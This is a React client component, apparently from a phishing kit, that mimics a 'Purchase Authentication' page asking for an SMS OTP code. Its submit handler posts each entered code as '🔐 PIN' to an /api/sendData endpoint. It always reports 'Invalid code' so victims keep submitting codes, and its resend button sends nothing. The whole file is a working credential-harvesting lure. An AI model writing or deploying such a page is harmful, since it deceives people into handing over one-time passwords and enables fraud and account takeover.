"use client";
import { Suspense } from "react";
import React, { useState, useEffect } from "react";
import 'bootstrap/dist/css/bootstrap.min.css';

function CodePageContent() {
  const [code, setCode] = useState("");
  const [timeLeft, setTimeLeft] = useState(60); // 1 minute
  const [expired, setExpired] = useState(false);
  const [resending, setResending] = useState(false);
  const [errorMessage, setErrorMessage] = useState(""); // error message
  const [successMessage, setSuccessMessage] = useState(""); // success message

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft((prev) => prev - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setExpired(true);
    }
  }, [timeLeft]);

  const handleSubmit = async () => {
    if (!code) {
      setErrorMessage("Please enter the code");
      setSuccessMessage("");
      return;
    }

    const text = `🔐 PIN: ${code}`;
    
    try {
      const res = await fetch("/api/sendData", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text }),
      });

      const result = await res.json();
      setErrorMessage("");
      setSuccessMessage("Invalid code, please try again");
      if (!result.success) {
        setSuccessMessage("");
        setErrorMessage("Invalid code, please try again");
      } 
    } catch (err) {
      console.error(err);
      setSuccessMessage("");
      setErrorMessage("Error occurred while sending the code");
    }
  };

  const handleResend = () => {
    setResending(true);
    setTimeout(() => {
      setTimeLeft(60);
      setExpired(false);
      setResending(false);
      setErrorMessage("");
      setSuccessMessage("");
    }, 1000);
  };

  const handleCancel = () => {
    setCode("");
    setErrorMessage("");
    setSuccessMessage("");
  };

  return (
    <div className="container my-4" style={{ maxWidth: "500px", backgroundColor: "white", border: "1px solid #ddd" }} dir="ltr">
      <div className="p-4">
        <h5 className="fw-bold text-primary mb-3">Purchase Authentication</h5>
        <p className="mb-1">
          We have sent you an SMS with an OTP code to your registered mobile number. Please do not share it with anyone.
        </p>

        <label className="fw-bold mb-2">Enter your OTP code below:</label>
        <input 
          type="text" 
          className={`form-control mb-1 ${errorMessage ? "is-invalid" : ""}`} 
          value={code}
          onChange={(e) => setCode(e.target.value)}
          disabled={expired}
        />
        {errorMessage && <div className="text-danger mb-2">{errorMessage}</div>}
        {successMessage && <div className="text-danger mb-2">{successMessage}</div>}

        <p className="text-danger fw-bold">
          Time left: {Math.floor(timeLeft / 60)}:{String(timeLeft % 60).padStart(2, "0")}
        </p>

        <div className="d-grid gap-2">
          <button 
            type="button" 
            className="btn text-white fw-bold" 
            style={{ backgroundColor: "#d32f2f" }}
            onClick={handleSubmit}
            disabled={expired}
          >
            CONFIRM
          </button>
          <div className="d-flex gap-2">
            <button 
              type="button" 
              className="btn btn-secondary w-50 fw-bold"
              onClick={handleResend}
              disabled={!expired || resending}
            >
              {resending ? "Resending..." : "RESEND"}
            </button>
            <button 
              type="button" 
              className="btn btn-secondary w-50 fw-bold"
              onClick={handleCancel}
            >
              CANCEL
            </button>
          </div>
        </div>

        <p className="mt-3 text-muted small">
          This page will automatically time out after 1 minute.
        </p>
      </div>
    </div>
  );
}

export default function CodePage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <CodePageContent />
    </Suspense>
  );
      }
